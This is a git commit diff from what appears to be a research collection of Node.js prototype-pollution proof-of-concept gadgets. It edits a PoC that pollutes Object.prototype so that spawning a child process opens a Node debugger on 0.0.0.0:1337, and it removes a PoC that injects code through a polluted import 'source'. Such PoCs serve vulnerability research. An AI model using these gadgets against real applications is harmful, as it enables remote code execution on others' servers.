d2d9f27f779c58ddfdbc1c55397109864b987f1b
Mikhail Shcherbakov <yuske.dev@gmail.com>
2024-04-12 11:24:35 +0200

    Minor fixes

--- nodejs/child_process/spawn.env.PoC.js
+++ nodejs/child_process/spawn.env.PoC.js
@@ -4,7 +4,7 @@ Object.prototype.shell = "node";
 Object.prototype.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337';
 
 async function main() {
-  const cp = await spawnSync('hostname');
+  const cp = await spawn('hostname');
   console.log(cp.output.toString());
 }
 
--- nodejs/import/import.source.PoC.js
+++
@@ -1,4 +0,0 @@
-
-Object.prototype.source = 'console.log("PWNED")'
-
-import('./test.mjs')
